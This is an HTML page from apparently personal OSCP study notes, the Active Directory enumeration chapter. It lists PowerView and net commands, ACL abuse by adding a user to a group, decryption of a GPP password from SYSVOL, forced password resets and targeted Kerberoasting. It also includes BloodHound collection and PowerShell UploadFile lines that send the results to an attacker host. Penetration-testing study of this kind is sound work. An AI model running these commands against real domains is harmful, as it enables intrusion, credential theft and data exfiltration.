@@ -1,0 +1,457 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Enumeration - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">1.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">1.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">1.3.</strong> File Transfer</a></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">1.4.</strong> Ports</a></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">1.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">2.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.2.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">2.3.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">2.3.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">2.3.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">2.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">2.5.</strong> File Uploads</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">2.5.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">2.5.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">2.5.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">2.6.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">2.7.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">2.8.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">2.9.</strong> SQL</a></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">2.10.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">2.11.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">2.12.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">3.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">5.1.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html" class="active"><strong aria-hidden="true">5.2.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">5.3.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">5.4.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">5.5.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">5.6.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">5.7.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <ul>
+<li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file">S1ckB0y1337 Notes</a></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Active%20Directory%20Attack/">Payload All the Things AD Attack</a></li>
+</ul>
+<h3 id="manual-enumeration"><a class="header" href="#manual-enumeration">Manual Enumeration</a></h3>
+<pre><code>Without PowerView:
+net user # All local accounts
+net user &lt;user&gt;
+net user /domain # All local users in entire domain
+net user &lt;username&gt; /domain # See if he is member of *Domain Admins group in *Global group memberships
+
+# IMP
+net group /domain # Enumerate Groups in Domain
+net group "Domain Admins" # To find who is part of domain admins
+
+PowerView (HeathAdams)
+PowerShell -ep bypass
+. .\PowerView.ps1
+
+Get-NetDomainController # IP of DC, Name of DC
+
+Get-DomainPolicy # Domain policies, like pass policies ,etc
+(Get-DomainPolicy).”SystemAccess”
+
+Get-NetUser # All users # Sometimes password in Decription
+Get-NetUser | select samaccountname # Only account names
+Get-NetUser | select cn # Only usernames
+Get-NetUser | select description # Only descriptions
+Get-NetUser -SPN | select serviceprincipalname # Kerbroastable SPN's
+
+Get-UserProperty
+Get-UserProperty -Properties pwdlastset # Last password set
+Get-UserProperty -Properties logoncount # Good way to know honeypot accounts
+Get-UserProperty -Properties badpwdcount # Bad password attempts
+
+Get-NetComputer # Computers in domain
+Get-NetComputer -FullData
+Get-NetComputer -Unconstrained
+Get-NetComputer | Get-NetLoggedon # Active users
+Get-NetComputer -FullData | select OperatingSystem # OS
+
+Get-NetGroup -GroupName *admin* # Important # Groups
+Get-NetGroupMember -GroupName "Domain Admins" 
+# Important # Members of Domain Admins group
+Get-NetGroup -AdminCount | select name,memberof,admincount,member # Part of domain admin
+
+Invoke-ShareFinder # For shares
+
+Get-NetGPO # Group policies
+Get-NetGPO | select displayname, whenchanged # Better output
+
+# Get-DomainOU -&gt; Search for all (OUs) or specific OU objects in AD.
+Get-DomainOU -Properties Name | sort -Property Name
+</code></pre>
+<h3 id="more-manual"><a class="header" href="#more-manual">More Manual</a></h3>
+<pre><code>
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+
+Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname, distinguishedname, operatingsystemversion
+
+
+Find-LocalAdminAccess
+Get-NetSession -ComputerName files04
+Get-NetSession -ComputerName web04
+Get-NetSession -ComputerName files04 -Verbose
+Get-NetSession -ComputerName web04 -Verbose
+Get-NetSession -ComputerName client74
+Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+.\PsLoggedon.exe \\files04
+.\PsLoggedon.exe \\web04
+.\PsLoggedon.exe \\client74
+
+
+setspn -L iis_service
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+nslookup.exe web04.corp.com
+
+</code></pre>
+<h3 id="manual-object-permissions"><a class="header" href="#manual-object-permissions">Manual Object Permissions</a></h3>
+<pre><code>
+Permission Types:
+GenericAll: Full permissions on object
+GenericWrite: Edit certain attributes on the object
+WriteOwner: Change ownership of the object
+WriteDACL: Edit ACE's applied to object
+AllExtendedRights: Change password, reset password, etc.
+ForceChangePassword: Password change for object
+Self (Self-Membership): Add ourselves to for example a group
+
+
+Get-ObjectAcl -Identity stephanie
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
+
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+
+net group "Management Department" stephanie /add /domain
+Get-NetGroup "Management Department" | select member
+net group "Management Department" stephanie /del /domain
+Get-NetGroup "Management Department" | select member
+</code></pre>
+<h3 id="manual-domain-shares"><a class="header" href="#manual-domain-shares">Manual Domain Shares</a></h3>
+<pre><code>
+
+Find-DomainShare
+ls \\dc1.corp.com\ADMIN$\
+ls \\dc1.corp.com\sysvol\corp.com\
+ls \\dc1.corp.com\sysvol\corp.com\Policies\
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+ls \\FILES04\docshare
+ls "\\FILES04\Important Files"
+cat "\\FILES04\Important Files\proof.txt"
+ls \\FILES04\docshare\docs\do-not-share
+cat \\FILES04\docshare\docs\do-not-share\start-email.txt
+
+</code></pre>
+<h3 id="automate"><a class="header" href="#automate">Automate</a></h3>
+<pre><code>
+Import-Module .\Sharphound.ps1
+Get-Help Invoke-BloodHound
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\ -OutputPrefix "medtech12audit"
+ls C:\Users\stephanie\Desktop\
+
+
+powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\temp\medtech12audit_20240208023054_BloodHound.zip')"
+
+(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\Users\stephanie\Desktop\corp audit_20240201105818_BloodHound.zip')
+
+
+
+sudo neo4j start
+**http://localhost:7474**
+neo4j/neo4j
+bloodhound
+
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+
+Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+
+Get-DomainSPNTicket -Credential $Cred harmj0y | fl
+
+Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
+
+or
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('CORP\dfm.a', $SecPassword)
+
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword -Credential $Cred
+
+
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword
+
+net user robert Password123! /domain
+
+
+# Find-InterestingDomainAcl
+
+
+</code></pre>
+<h2 id="custom-bloodhound-queries"><a class="header" href="#custom-bloodhound-queries">Custom BloodHound Queries</a></h2>
+<h3 id="query-to-list-all-users"><a class="header" href="#query-to-list-all-users">Query to List All Users</a></h3>
+<p>This query returns all user objects in the Active Directory, which can be useful for identifying potential targets for further exploitation or reconnaissance.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (u:User) RETURN u.name</code></p>
+<h3 id="query-to-list-all-computers"><a class="header" href="#query-to-list-all-computers">Query to List All Computers</a></h3>
+<p>This query returns all computer objects in the Active Directory. Identifying all computers can help in understanding the network's structure and identifying valuable targets for lateral movement or further exploitation.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (c:Computer) RETURN c.name</code></p>
+<h3 id="1-find-all-domain-admins"><a class="header" href="#1-find-all-domain-admins">1. Find All Domain Admins</a></h3>
+<p>Identify all users who are members of the Domain Admins group, which will give you insights into high-value targets within the network.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (g:Group)-[:MemberOf*1..]-&gt;(h:Group {name: 'Domain Admins@DOMAIN.COM'}) MATCH (u:User)-[:MemberOf]-&gt;(g) RETURN u.name</code></p>
+<h3 id="2-uncover-shortest-paths-to-domain-admins"><a class="header" href="#2-uncover-shortest-paths-to-domain-admins">2. Uncover Shortest Paths to Domain Admins</a></h3>
+<p>Discover the shortest paths that could be exploited to elevate privileges to Domain Admin level. This can help in planning an attack route.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (u:User),(g:Group {name: 'Domain Admins@DOMAIN.COM'}), p = shortestPath((u)-[:MemberOf*1..]-&gt;(g)) RETURN p</code></p>
+<h3 id="3-identify-users-with-unconstrained-delegation-rights"><a class="header" href="#3-identify-users-with-unconstrained-delegation-rights">3. Identify Users with Unconstrained Delegation Rights</a></h3>
+<p>Users with unconstrained delegation rights can impersonate any user to any service. This query helps identify such users, presenting a significant security risk.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (u:User {allowedtodelegate: true}) RETURN u.name</code></p>
+<h3 id="4-find-computers-where-domain-admins-have-sessions"><a class="header" href="#4-find-computers-where-domain-admins-have-sessions">4. Find Computers Where Domain Admins Have Sessions</a></h3>
+<p>Identifying machines where Domain Admins have active sessions can be useful for moving laterally within the network.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (c:Computer)&lt;-[:HasSession]-(u:User) WHERE u.name CONTAINS 'Domain Admins@DOMAIN.COM' RETURN c.name, u.name</code></p>
+<h3 id="5-detect-all-kerberoastable-accounts"><a class="header" href="#5-detect-all-kerberoastable-accounts">5. Detect All Kerberoastable Accounts</a></h3>
+<p>Kerberoasting targets service accounts by requesting service tickets that can be cracked offline. This query finds service accounts that can be Kerberoasted.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (u:User {hasspn: true})  RETURN u.name</code></p>
+<h3 id="6-enumerate-acl-exploitation-paths"><a class="header" href="#6-enumerate-acl-exploitation-paths">6. Enumerate ACL Exploitation Paths</a></h3>
+<p>Access Control List (ACL) exploitation can be a powerful method for escalating privileges. This query helps identify potential ACL exploit paths.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH p = (n)-[r:WriteDacl|WriteOwner|GenericAll|GenericWrite|Owns]-&gt;(m) RETURN p</code></p>
+<h3 id="7-find-all-trust-relationships"><a class="header" href="#7-find-all-trust-relationships">7. Find All Trust Relationships</a></h3>
+<p>Understanding trust relationships between domains can reveal paths for lateral movement and privilege escalation.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (d:Domain)-[:TrustedBy]-&gt;(t:Domain) RETURN d.name, t.name</code></p>
+<h3 id="8-identify-orphaned-objects"><a class="header" href="#8-identify-orphaned-objects">8. Identify Orphaned Objects</a></h3>
+<p>Orphaned objects (users, computers) can sometimes retain privileges and be overlooked. This query helps spot such objects.</p>
+<p>cypherCopy code</p>
+<p><code>MATCH (n) WHERE NOT (n)-[:MemberOf]-&gt;() RETURN n.name, labels(n)</code></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="WeGotUsersbutnoPass.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="ADAuth.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="WeGotUsersbutnoPass.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="ADAuth.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
